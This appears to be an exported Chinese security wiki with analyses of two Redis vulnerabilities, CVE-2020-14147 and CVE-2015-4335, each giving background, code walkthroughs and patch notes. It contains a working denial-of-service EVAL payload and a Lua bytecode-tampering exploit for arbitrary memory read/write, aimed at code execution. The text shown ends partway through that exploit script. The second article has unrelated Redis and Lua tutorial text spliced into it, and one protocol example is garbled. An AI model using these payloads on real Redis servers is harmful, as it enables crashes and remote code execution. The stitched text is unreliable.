其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 ​ RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组： 12345*2 CRLF$7 CRLFSangfor CRLF$4 CRLFTEST CRLF ​ 所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送： 1234567*3 CRLF$3 CRLFSET CRLF$4 CRLF1234 CRLF$4 CRLFTEST CRLF ​ Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/ ​ Redis客户端可通过EVAL命令使用此解释器。 Lua脚本允许用户管理和操纵Redis服务器上的记录。 例如，以下Lua脚本可用于执行上述SET命令： 1EVAL &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0 ​ 执行此Lua脚本的另一种方法是使用SCRIPT LOAD和EVALSHA命令。 SCRIPT LOAD命令在服务器上缓存Lua脚本，并返回SHA1摘要。 EVALSHA命令可以与此SHA1摘要一起用作执行脚本的参数。 下面是一个示例： 12SCRIPT LOAD &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0EVALSHA &lt;SHA1 digest from above&gt; ​ Lua还提供了分别使用struct.pack和struct.unpack方法将Lua变量与C类型的Stucts相互转换的方法。 例如，以下内容可用于包装整数： 1struct.pack (&quot;&lt;I2&quot;, 10) “I”指定整数是无符号的（“ i”用于有符号整数） “&lt;”指定应以小端格式表示（“&gt;”用于大端格式） “2”指定整数为2个字节长 “10”指定要打包的整数的值 详细分析漏洞利用过程​ Redis中存在堆栈缓冲区溢出漏洞。 在攻击情况下，struct.pack方法用于转换指定为第一个参数的非常大的整数（2^31）。 lua_struct.c尝试通过调用getnum（）将此字符串参数转换为整数。 这导致整数溢出，导致大小被错误地计算为负数，从而绕过边界检查。 然后，此负数通过optsize（）强制转换为size_t类型的变量，这将其解释为大正数。 之后，putinteger（）尝试将由这个大数字表示的字节数复制到32字节的缓冲区中，从而导致缓冲区溢出。 代码分析​ 以下代码段摘自lua_struct.c，Redis版本6.0.0。 ​ 分析lua_struct.c中b_pack（）函数，size变量存放optsize（）函数的返回值，optsize（）函数将有符号的int类型转换为size_t（无符号的int类型）整数溢出发生字此函数内，之后size变量传入putinteger（）函数，缓冲区溢出发生在此函数内。 ​ 先跟进optsize（）函数，看如何处理opt变量和fmt二级指针（指向指针的指针），发现当opt变量为字符’i’或’I’时，将fmt二级指针传入 getnum（）函数，将返回的值存入sz变量中，if语句判断sz变量是否大于MAXINTSIZE；当sz发生整数溢出时，值为负值且小于MAXINTSIZE（0x7fffffff），所以跳过此报错判断。 ​ 跟进getnum（）函数，字符串转整型，缺少边界检查，当字符串表示的数大于MAXINTSIZE（0x7fffffff）时，直接返回负值。 ​ 跟进putinteger（）函数，变量size是无符号的整数，经过int类型转换后，负值变为一个大于0x7fffffff的大数，buff数组范围为MAXINTSIZE（0x7fffffff），size变量范围大于MAXINTSIZE（0x7fffffff），故导致缓冲区溢出。 漏洞触发过程​ struct.pack指定为第一个参数的非常大的整数（2^31）,b_pack（）———&gt;optsize（）———&gt;getnum（）导致整数溢出；返回的无符号变量size传入，putinteger（）导致缓冲区溢出。 ​ 发送poc后，到达崩溃现场，ESP与EBP中间地址被覆盖： ​ Redis服务端尝试恢复内存数据失败后退出进程，达到拒绝服务目的。 补丁分析​ 官方已经发布补丁，在getnum（）函数处，增加lua_State变量指针L，来存放错误信息，在98-99行增加代码： 12if (a &gt; (INT_MAX / 10) || a * 10 &gt; (INT_MAX - (**fmt - &#x27;0&#x27;))) luaL_error(L, &quot;integral size overflow&quot;); ​ 对当前变量a的值做判断，若当前a大于INT_MAX/10或者当前a*10大于INT_MAX-当前位的值，则返回报错信息L，提示size值超过缓冲区的值。从根本上避免了整数溢出，也避免了后续因为有符号上溢，而导致的缓冲区溢出。 流量分析攻击包分析​ 攻击包为RESP协议，Redis默认监听在6379，使用Redis命令，Redis命令详解请看 3.1技术背景。 1234567*3表示创建一个大小为3的数组$4EVAL 表示创建长度为4的字符串,值为EVAL$42struct.pack(&#x27;&lt;4294967295&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;) 同上$1 0 同上 ​ 流量结构等同于在Redis客户端输入以下命令： 1EVAL &quot;struct.pack(&#x27;&lt;4294967295&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;)&quot; 0 ​ 之后无返回数据，则说明拒绝服务攻击成功。 正常包分析​ Redis客户端发送RESP命令： 1EVAL &quot;struct.pack(&#x27;&lt;I1&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;)&quot; 0 ​ 正常包是符合RESP协议，会有回显。 漏洞检测和防御漏洞检测​ 缓冲区溢出漏洞只能通过版本对比检测。 ​ 运行Redis-server后，控制台会打印版本信息，通过版本比对，若版本低于6.0.3，则有漏洞。 漏洞防御​ 匹配6379端口的流量，匹配字符串的RESP数组。 由于RESP数组始终以“ *”字符开头，对该字符进行字符串匹配。 检测数组的元素是否有EVAL或SCRIPT LOAD命令。 ​ 然后，检测调用struct.pack（）方法的数组中匹配Lua脚本代码，并提取该方法的第一个参数。 必须确保此字符串参数的前两个字节包含以下任何字符：“ I”，“ i”，“ &lt;”或““&gt;”。 如果此值大于0x7FFFFFFF，则应将流量视为恶意流量，并且可能正在利用此漏洞进行攻击。 必须以区分大小写的方式对Lua脚本代码中的对象和方法名称进行字符串匹配。 必须以不区分大小写的方式执行RESP协议上的字符串匹配。 由于脚本语言的性质，使用各种脚本技术很容易混淆代码的真实攻击。 漏洞修复https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571 参考资料 https://nvd.nist.gov/vuln/detail/CVE-2020-14147 https://download.redis.io/releases/ https://redis.io/download","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞","date":"2021-07-06T08:21:23.000Z","path":"wiki/漏洞相关/Redis/CVE-2015-4335-Redis-EVAL-Lua沙箱绕过漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis EVAL Lua沙箱绕过漏洞 漏洞编号：CVE-2015-4335 漏洞类型：代码注入 CVSS评分：【CVSS v2.0：10.0】【CVSS v3.0：】 漏洞危害等级：高危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 ​ 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码。 漏洞影响Redis:up to 2.8.20 Redis:3.0.0 up to 3.0.1 漏洞修复https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411 漏洞复现应用协议6379/RESP（Redis的序列化协议） 漏洞复现 漏洞分析技术背景​ Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 ​ 例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录： 123SET 1234 TESTGETSET 1234 TEST2GET 1234 ​ 有关Redis命令的完整列表，请参考 http://redis.io/commands ​ Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 http://redis.io/topics/protocol获得该协议详细说明。 RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识： 简单字符串以“ +”字符开头 错误以“-”字符开头 整数以“：”字符开头 批量字符串以“ $”字符开头 数组以“ *”字符开头 ​ 批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串： 12$7 CRLFTELUS ​ 其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 ​ RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组： 12345*2 CRLF$7 CRLFSangfor CRLF$4 CRLFTEST CRLF ​ 所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送： 1234567*3 CRLF$3 CRLFSET CRLF$4 CRLF1234 CRLF$4 CRLFTEST CRLF ​ Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/ ​ Redis客户端可通过EVAL命令使用此解释器。 Lua脚本允许用户管理和操纵Redis服务器上的记录。 例如，以下Lua脚本可用于执行上述SET命令： 1EVAL &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0 ​ 执行此Lua脚本的另一种方法是使用SCRIPT LOAD和EVALSHA命令。 SCRIPT LOAD命令在服务器上缓存Lua脚本，并返回SHA1摘要。 EVALSHA命令可以与此SHA1摘要一起用作执行脚本的参数。 下面是一个示例： 12SCRIPT LOAD &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0EVALSHA &lt;SHA1 digest from above&gt; ​ Lua还提供了分别使用struct.pack和struct.unpack方法将Lua变量与C类型的Stucts相互转换的方法。 例如，以下内容可用于包装整数： 1struct.pack (&quot;&lt;I2&quot;, 10) “I”指定整数是无符号的（“ i”用于有符号整数） “&lt;”指定应以小端格式表示（“&gt;”用于大端格式） “2”指定整数为2个字节长 “10”指定要打包的整数的值 ZADD key score member [[score member] [score member] …] 可用版本： &gt;= 1.2.0 时间复杂度: O(M*log(N))， N 是有序集的基数， M 为成功添加的新成员的数量。 将一个或多个 member 元素及其 score 值加入到有序集 key 当中。 如果某个 member 已经是有序集的成员，那么更新这个 member 的 score 值，并通过重新插入这个 member 元素，来保证该 member 在正确的位置上。 score 值可以是整数值或双精度浮点数。 如果 key 不存在，则创建一个空的有序集并执行 ZADD 操作。 当 key 存在但不是有序集类型时，返回一个错误。 对有序集的更多介绍请参见 sorted set 。 Note：在 Redis 2.4 版本以前， ZADD 每次只能添加一个元素。 返回值 被成功添加的新成员的数量，不包括那些被更新的、已经存在的成员。 代码示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 添加单个元素redis&gt; ZADD page_rank 10 google.com(integer) 1# 添加多个元素redis&gt; ZADD page_rank 9 baidu.com 8 bing.com(integer) 2redis&gt; ZRANGE page_rank 0 -1 WITHSCORES1) &quot;bing.com&quot;2) &quot;8&quot;3) &quot;baidu.com&quot;4) &quot;9&quot;5) &quot;google.com&quot;6) &quot;10&quot;# 添加已存在元素，且 score 值不变redis&gt; ZADD page_rank 10 google.com(integer) 0redis&gt; ZRANGE page_rank 0 -1 WITHSCORES # 没有改变1) &quot;bing.com&quot;2) &quot;8&quot;3) &quot;baidu.com&quot;4) &quot;9&quot;5) &quot;google.com&quot;6) &quot;10&quot;# 添加已存在元素，但是改变 score 值redis&gt; ZADD page_rank 6 bing.com(integer) 0redis&gt; ZRANGE page_rank 0 -1 WITHSCORES # bing.com 元素的 score 值被改变1) &quot;bing.com&quot;2) &quot;6&quot;3) &quot;baidu.com&quot;4) &quot;9&quot;5) &quot;google.com&quot;6) &quot;10&quot; LuaDec是lua 5.1的Lua反编译器，并且是lua 5.2和5.3的实验版。它基于Hisham Muhammad的luadec，其针对Zsolt Sz的lua 5.0.x和LuaDec51。Sztupak。 LuaDec是免费软件，并且使用与原始LuaDec相同的许可证。 编译中 1234567git clone https://github.com/viruscamp/luadeccd luadecgit submodule update --init lua-5.1cd lua-5.1make linuxcd ../luadecmake LUAVER=5.1 如果要为lua 5.2或5.3构建它，只需将上面的5.1替换为5.2或5.3。 还有vc2008的项目文件，已针对vc2008和vc2013进行了测试。编译之前，请确保lua-5.1，lua-5.2或lua-5.3中的源正确。 用法 反编译lua二进制文件：luadec abc.luac 反编译lua源文件以进行测试和比较：luadec abc.lua 反汇编lua源代码或二进制luadec -dis abc.lua -pn打印嵌套函数结构，-fn可以使用 12345luadec -pn test.lua0 0_0 0_0_0 0_1 -f仅反编译特定的嵌套函数luadec -f 0_1 test.lua -ns不处理子函数luadec -ns -f 0_1 test.lua -fc对每个函数luadec -fc test.lua进行逐条指令比较：输出-函数检查通过0-函数检查失败0_0：无法编译-函数检查失败0_1：不同的代码大小；sizecode组织：66；反编译：67；相同：47； 还有更多选项，通常用于调试目的，或用于内置本地猜测器猜测错误的情况。使用-h获取可用参数的完整列表 lua的字节码 ​ lua源码在执行前，会被编译为字节码，字节码能加快程序的加载，保存lua源码被意外的修复。lua的字节码只在具有相同的字长和字节顺序的机器上能够移植。​ luac编译器能将lua源码编译为字节码二进制文件，其命令如: 1luac a.lua ​ luac默认的输出文件为luac.out,可以通过 -o 选项来指定输出文件。 1luac -o a.out a.lua ​ 当Lua发布新版时，luac生成的二进制文件的内部格式可能改变。 字节码文件头 lua5.1字节码文件头的长度为12字节，Win7 64位，VS下编译为Win32应用如下： 11b4c 7561 5100 0104 0404 0800 其中第1-4字节为：”\\033Lua”；第5字节标识lua的版本号，lua5.1为 0x51；第6字节为官方中保留，lua5.1中为 0x0；第7字节标识字节序，little-endian为0x01，big-endian为0x00；第8字节为sizeof(int)；第9字节为sizeof(size_t)；第10字节为sizeof(Instruction)，Instruction为lua内的指令类型，在32位以上的机器上为unsigned int；第11字节为sizeof(lua_Number)，lua_Number即为double;第12字节是判断lua_Number类型起否有效，一般为 0x00; lua5.2字节码文件头的长度为18字节，在我的环境里(Win7 64位，VS下编译为Win32应用)如下： 11b4c 7561 5200 0104 0404 0800 1993 0d0a 1a0a 其中第1-12字节与lua5.1意义相同，第5字节在lua5.2中为 0x52；第13-18字节是为了捕获字节码的转换错误而设置的，其值为 “\\x19\\x93\\r\\n\\x1a\\n”； PS:lua在判断字节序时使用的方法如下： 12345671 void luaU_header (char* h)2 &#123;3 int x=1;4 //...5 *h++=(char)*(char*)&amp;x; /* endianness */6 //...7 &#125; 在little-endian时，*(char*)&amp;x值为0x01；big-endian时，*(char*)&amp;x值为 0x00； 字节码文件正文 ​ lua5.1 在文件头之后，就是正头，它由一个个函数组成，其中第一个函数包含由文件内全部内容，引全局函数名为”@”+文件件名(包含”.lua”后缀)，在此文件中定义的函数都会在全局函数中以常量字符串保存；每个函数的内容缓存如下： 123456789101112131415源文件名的长度(包括&#x27;\\0&#x27;)，为sizeof(size_t)个字节长，只有全局函数有源文件名，其它内部函数其长度填0；源文件名(包括\\0)，长度为长度*sizeof(char)个字节；函数行数，全局函数的填0，长度为sizeof(int)个字节；函数的最后一行，全局函数的填0，长度为sizeof(int)个字节；函数的upvalues数目，长度为sizeof(char)个字节；函数的参数个数，全局函数的填0，长度为sizeof(char)个字节；函数的vararg个数，只有全局函数有；函数最大的栈数目，长度为sizeof(char)个字节；函数的指令数目，长度为sizeof(int)个字节；函数的指令，长度为指令数目*sizeof(Instruction)个字节；函数中常量的数目，长度为sizeof(int)个字节；函数中的常量，长度为常量数目*(常量类似标识长度+指定常量点用的长度)，常量类似标识长度为sizeof(char)个字节；函数中的内部函数数目，长度为sizeof(int)个字节；内部函数的定，格式同外部函数；函数的调试信息； ​ 文件binc.lua的内容如下： 121 local i = 6;2 return 1; ​ 其正文的字节码(lua5.1编译，不包括调试信息,前面的空白外为文件头)： 123456 0a00 00004062 696e 632e 6c75 6100 0000 0000 00000000 0000 0202 0400 0000 0100 0000 41400000 5e00 0001 1e00 8000 0200 0000 03000000 0000 0018 4003 0000 0000 0000 f03f0000 0000 ​ lua5.2 的正文部分与lua5.1存在差别。其没有源文件名的说明，别对于upvalue的处理也不一样，lua5.2中upvalue在常量后面定义，由upvalue的数目后加上分upvalue的定义组成。 string.gsub() 原型：string.gsub (s, pattern, repl [,m]) 解释：这个函数会返回一个替换后的副本，原串中所有的符合参数pattern的子串都将被参数repl所指定的字符串所替换，如果指定了参数m，那么只替换查找过程的前m个匹配的子串，参数repl可以是一个字符串、表、或者是函数，并且函数可以将匹配的次数作为函数的第二个参数返回，接下来看看参数repl的含义： 如果参数repl是一个常规字符串，成功匹配的子串会被repl直接替换，如果参数repl中包含转移字符%，那么可以采用%n的形式替换，当%n中的n取值1-9时，表示一次匹配中的第n个子串，当其中的n为0时，表示这次匹配的整个子串，%%表示一个单独的%。 如果参数repl是一个表，那么每次匹配中的第一个子串将会作为整个表的键，取table[匹配子串]来替换所匹配出来的子串，当匹配不成功时，函数会使用整个字符串来作为table的键值。 如果参数repl是一个函数，那么每一次匹配的子串都将作为整个函数的参数，取function(匹配子串)来替换所匹配出来的子串，当匹配不成功时，函数会使用整个字符串来作为函数的参数。如果函数的返回值是一个数字或者是字符串，那么会直接拿来替换，如果它返回false或者nil，替换动作将不会发生，如果返回其他的值将会报错。 Usage 首先新建一个文件将文件命名为gsubtest.lua然后编写如下代码： 123456789101112131415161718192021222324252627282930-- 常规替换x = string.gsub(&quot;hello world&quot;, &quot;(%w+)&quot;, &quot;lua&quot;)print(&quot;\\n&quot;,x)-- 都用匹配的第一个串*2来替换x = string.gsub(&quot;hello world&quot;, &quot;(%w+)&quot;, &quot;%1 %1&quot;)print(&quot;\\n&quot;,x)-- 用匹配出的完成串*2来替换第一次匹配的结果x = string.gsub(&quot;hello world&quot;, &quot;%w+&quot;, &quot;%0 %0&quot;, 1)print(&quot;\\n&quot;,x)-- 使用一个完整匹配和一个匹配的第二个串来替换x = string.gsub(&quot;hello world from c to lua&quot;, &quot;(%w+) (%a+)&quot;, &quot;%0 %2&quot;)print(&quot;\\n&quot;,x)-- 调用系统函数来替换x = string.gsub(&quot;os = $OS, pathext = $PATHEXT&quot;, &quot;%$(%w+)&quot;, os.getenv)print(&quot;\\n&quot;,x)-- 调用自定义函数x = string.gsub(&quot;4 + 5 = $return 4+5$&quot;, &quot;%$(.-)%$&quot;, function (s) return loadstring(s)() end)print(&quot;\\n&quot;,x)-- 调用表来替换local t = &#123;name=&quot;lua&quot;, version=&quot;5.1&quot;&#125;x = string.gsub(&quot;$name-$version.tar.gz&quot;, &quot;%$(%w+)&quot;, t)print(&quot;\\n&quot;,x) 有一点需要注意的是，使用函数作为替换结果时，函数只能返回数字、字符串、false和nil。 string.dump() 原型：string.dump (function) 解释：返回一个包含所给函数二进制描述的字符串，以至于在此之后可以使用函数loadstring()利用所得到的字符串来返回一个函数拷贝，需要注意的是函数只能是Lua函数并且没有upvalues(外部局部变量)。 Usage 首先新建一个文件将文件命名为dumptest.lua如下代码: 123456789101112131415161718192021222324252627282930313233343536--自定义一个函数function custom_func(num1, num2) local ret = num1 + num2; print(&quot;\\nnum1 = &quot;..num1) print(&quot;num2 = &quot;..num2) print(&quot;num1 + num2 = &quot;..ret)end-- 将函数序列化local func_content = string.dump(custom_func)print(&quot;\\nfunc_content = &quot;..func_content)-- 将转化后的字符串写入文件local outfile = io.open(&quot;dumptest.txt&quot;, &quot;w&quot;)local outnum = outfile:write(func_content)outfile:close()-- 从文件总读取内容local infile = io.open(&quot;dumptest.txt&quot;, &quot;r&quot;)local incontent = infile:read(&quot;*a&quot;)infile:close()print(&quot;\\ninput content is &quot;..incontent)-- 加载函数local myfunc = loadstring(incontent)-- 执行函数myfunc(1, 1)myfunc(3, 6)-- 输出这个幸福的七月七myfunc(&quot;7&quot; ,&quot;.7&quot;)print(&quot;\\nthis is a happy day!&quot;)print(os.date()) 看了这个函数是不是有种非常神奇的感觉，原来传说中的序列化可以离我们这么近。 在调用了函数string.dump()之后函数custom_func()被转化成字符串保存在文件中，可以在使用时再取出来。 这个函数一般写逻辑代码应该用不到，更多的是做框架的时候用的功能，进过序列化的函数可以通过网络传送、转化、再使用。 loadstring() loadstring(string [,chunkname]) 解释：函数会从所给的字符串中来加载程序块并运行，常使用这种构造式来调用assert(loadstring(s))()，如果省略参数chunkname，那么它默认为所给的字符串。 usage 首先我们新建一个文件将文件命名为loadstring.lua然后编写代码如下： 12345678910111213141516171819202122232425-- 简单测试local ret = loadstring(&quot;print(\\&quot;first test loadstring function.\\&quot;)&quot;)print(&quot;\\nthe result ret is&quot;, ret)-- 运行返回值print(&quot;\\nthe result of running ret() is:&quot;)ret();-- 使用常用的方式print(&quot;\\nthe result of running common test is:&quot;)assert(loadstring(&quot;print(\\&quot;common test loadstring function.\\&quot;)&quot;))()-- 直接生成一个全局函数local func = loadstring(&quot;function func_test(str) print(\\&quot;str = \\&quot;, str) end&quot;)-- 测试函数是否生成print(&quot;\\nbefore run func, functest =&quot;, func_test)func()print(&quot;\\nafter run func, functest =&quot;, func_test, &quot;\\n&quot;)-- 测试参数chunkname的作用assert(loadstring(&quot;i = i + 1&quot;, &quot;third test&quot;))() 由结果一可知，函数loadstring()与函数loadfile()一样，都是返回一个函数。 由结果二可知，返回函数的内容就是字符串参数string的内容，执行返回的函数时，字符串中的代码就被执行了。 结果三展示了这个函数的一般使用方法。 结果四展示了如何通过字符串生成一个全局函数，但是无法生成局部函数，并且生成的函数func_test()在调用完函数func()之后才被创建出来 最后一个例子展示了参数chunkname的作用，就是在错误的提示信息中起到提示作用。 lua数据结构–闭包 闭包主要由以下2个元素组成： 函数原型：上图意在表明是一段可执行代码。在Lua中可以是lua_CFunction，也可以是lua自身的虚拟机指令。 上下文环境：在Lua里主要是Upvalues和env，下面会有说明Upvalues和env。 在Lua里，我们也从闭包开始，逐步看出整个结构模型，下面是Closure的数据结构：(lobject.h 291-312) ​ Lua的闭包分成2类，一类是CClosure，即luaC函数的闭包。另一类是LClosure，是Lua里面原生的函数的闭包。 ​ 分析一下两类Closure相同部分ClosureHeader： CommonHeader：和与TValue中的GCHeader能对应起来的部分 isC：是否CClosure nupvalues：外部对象个数 gclist：用于GC销毁 env：函数的运行环境 对于CClosure数据结构： lua_CFunction f：函数指针，指向自定义的C函数 TValue upvalue[1]：C的闭包中，用户绑定的任意数量个upvalue 对于LClosure数据结构： Proto *p：Lua的函数原型，在下面会有详细说明 UpVal *upvals：Lua的函数upvalue，这里的类型是UpVal，这里之所以不直接用TValue是因为具体实现需要一些额外数据。 UpVal的实现 什么是UpVal？先来看看代码： ​ 分析一下上面这段代码，最终testB的值显然是3+5+10=18。当调用testA(5)的时候，其实是在调用FuncB(5)，但是这个FuncB知道a = 3，这个是由FuncA调用时，记录到FuncB的外部变量，我们把a和c称为FuncB的upvalue。 ​ 下面描述一下Lua中的原生函数的函数原型，即Proto数据结构（lobject.h 231-253）： CommonHeader：Proto也是需要回收的对象，也会有与GCHeader对应的CommonHeader TValue* k：函数使用的常量数组，比如local d = 10，则会有一个10的数值常量 Instruction *code：虚拟机指令码数组 Proto **p：函数里定义的函数的函数原型，比如funcA里定义了funcB，在funcA的5. Proto中，这个指针的[0]会指向funcB的Proto int *lineinfo：主要用于调试，每个操作码所对应的行号 LocVar *locvars：主要用于调试，记录每个本地变量的名称和作用范围 TString **upvalues：一来用于调试，二来用于给API使用，记录所有upvalues的名称 TString *source：用于调试，函数来源，如c:\\t1.lua@ main sizeupvalues： upvalues名称的数组长度 sizek：常量数组长度 sizecode：code数组长度 sizelineinfo：lineinfo数组长度 sizep：p数组长度 sizelocvars：locvars数组长度 linedefined：函数定义起始行号，即function语句行号 lastlinedefined：函数结束行号，即end语句行号 gclist：用于回收 nups：upvalue的个数，其实在Closure里也有nupvalues，这里我也不太清楚为什么要弄两个，nups是语法分析时会生成的，而nupvalues是动态计算的。 numparams：参数个数 is_vararg：是否参数是”…”（可变参数传递） maxstacksize：函数所使用的stacksize ​ Proto的所有参数都是在语法分析和中间代码生成时获取的，相当于编译出来的汇编码一样是不会变的，动态性是在Closure中体现的。 详细分析漏洞利用过程​ 利用到的漏洞分别为OP_FORPREP/OP_FORLOOP、OP_CLOSURE中的类型混淆，LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。 具备任意地址读/写能力后是一定可以做代码执行的，目前想到如下两种方式。 1) 覆写CClosure-&gt;f ​ 在lua中可以使用coroutine.wrap创建C函数闭包对象CClosure，其结构如下： ​ CClosure-&gt;f指向函数指针，调用其对应的源码为deps/lua/src/ldo.c 307-326： 2) 覆写got ​ Linux PWN常规思路，通过DynELF解析Binary，进一步解析libc，获取system地址并覆写至fputs.got；在lua中调用print(“id”)即可执行命令。 代码分析​ 利用到的漏洞分别为OP_FORPREP/OP_FORLOOP、OP_CLOSURE中的类型混淆，LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。 ​ 这里以Redis 3.0.0版本进行分析。 123456#!cppasnum = loadstring(string.dump(function(x) for i = x, x, 0 do return i endend):gsub(&quot;\\96%z%z\\128&quot;, &quot;\\22\\0\\0\\128&quot;)) LUA字节码固定长度32bits，4字节，定义如下： 主要由op操作码、R(A)、R(B)、R(C)、R(Bx)、R(sBx)组成。A、B、C对应于LUA寄存器索引。 asnum函数可以将任意LUA对象转换为数字。（注：LUA5.1 64bitLinux环境）gsub函数将字节码\\96%z%z\\128替换为\\22\\0\\0\\128。 1) OP_FORPREP/OP_FORLOOP ​ lua中对for循环生成的字节码，利用luadec反编译工具查看.out文件的字节码如下： ​ 可以看到for循环是由FORPREP、FORLOOP两条指令组合而来，对应的源码是deps/lua/src/lvm.c 的luaV_execute函数（line 654-680）： ​ 在OP_FORPREP中，lua对参数进行类型检查，判断是否为number类型，若不是则触发错误；然而在OP_FORLOOP中，因已做过类型检查，便假定参数为number类型，并对其执行idx = idx + step操作，这导致任意类型到number类型的混淆。 ​ 如下修改字节码中的FORPREP指令\\96%z%z\\128为JMP指令\\22\\0\\0\\128，gsub函数将字节码\\96%z%z\\128替换为\\22\\0\\0\\128，如下。 ​ 正常情况下lua在forprep指令会检查参数是否为数字类型，并执行初始化，但是由于执行gsub函数后，forprep字节码被替换为JMP to 5，直接跳过OP_FORPREP中的类型检查，直接进入OP_FORLOOP (5)： ​ forloop指令直接将循环参数转换为lua_Number(double)类型，（因为正常情况下forprep已经检查过类型了），然后执行加法（+ 0），执行dojump return x；返回lua_Number。LUA使用TValue表示通用数据对象，格式如下: Value(64bit) tt(32bit) padd(32bit) n LUA_TNUMBER GCObject *gc; -&gt; TString* LUA_TSTRING GCObject *gc; -&gt; Closure* LUA_TFUNCTION 2) OP_CLOSURE ​ LUA使用CLOSURE A Bx指令创建函数的一个实例(或闭包)。Bx是要实例化的函数在函数原型表中的函数编号。例如：closure 2 0 ，创建0号函数对象，结果保存到2号寄存器。对CLOSURE指令的处理位于deps/lua/src/lvm.c 的luaV_execute函数（line 723-742）： ​ line 731-737是对闭包的处理，具体为在CLOSURE指令后后生成对应的MOVE指令，MOVE指令的第二个参数为闭包变量引用。正常情况下引用只能指向当前栈桢中的局部变量，但通过修改字节码，可以将其指向至任意位置。 ​ 如上，通过修改”(\\100%z%z%z)….”（MOVE 0 0）为”%1\\0\\0\\0\\1”（MOVE 0 2），将middle函数中的magic引用指向middle函数自身（R2），所以输出的结果为middle函数。 ​ 对函数调用的处理位于deps/lua/src/lvm.c line 586-606： ​ 对函数返回的处理位于deps/lua/src/lvm.c line 382-390： ​ line 385将L-&gt;ci-&gt;func（当前函数指针）转换为Closure指针，由上文可知，通过修改字节码可以将闭包变量引用指向当前函数指针，导致任意类型到Closure类型的混淆。 ​ 基于此，结合number类型混淆，可以做任意地址读/写： ​ 结尾处修改字节码，将middle/inner函数中的magic引用指向middle函数；inner函数中将magic赋值为字符串，这使得middle函数中的当前函数指针将被混淆为该字符串，函数返回； middle函数中读取闭包变量magic，读取闭包变量对应的源码为deps/lua/src/lvm.c line 427-431： ​ 其实际上是去当前函数指针的upvals字段中获取相应引用，而当前函数指针已被混淆为字符串，对应的upvals字段可控。 TString类型与Closure类型的结构如下： ​ 变量upval为字符串，as_double(upval)获取其TString指针，偏移24获取到upval-&gt;str地址，也就是说cl-&gt;p、cl-&gt;upvals[0]都指向输入的字符串”commonhead16bits” .. p32(lo) .. p32(hi)。 ​ UpVal结构如下： ​ 所以cl-&gt;upvals[0]-&gt;v指向构造的指针p32(lo) .. p32(hi)，也即为addr。 ​ 以上，便将任意地址的前8字节读取出来，写操作也是同理，只需要在middle函数中对magic赋值，需注意的是写操作实际会写入8字节数值及4字节tt类型： ​ deps/lua/src/lvm.c line 451-456： ​ deps/lua/src/lobject.h line 161-164： 触发poc.lua 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!cppasnum = loadstring(string.dump(function(x) for i = x, x, 0 do return i endend):gsub(&quot;\\96%z%z\\128&quot;, &quot;\\22\\0\\0\\128&quot;))ub4 = function(x) -- Convert little endian uint32_t to char[4] local b0 = x % 256; x = (x - b0) / 256 local b1 = x % 256; x = (x - b1) / 256 local b2 = x % 256; x = (x - b2) / 256 local b3 = x % 256 return string.char(b0, b1, b2, b3)endf2ii = function(x) -- Convert double to uint32_t[2] if x == 0 then return 0, 0 end if x &lt; 0 then x = -x end local e_lo, e_hi, e, m = -1075, 1023 while true do -- this loop is math.frexp e = 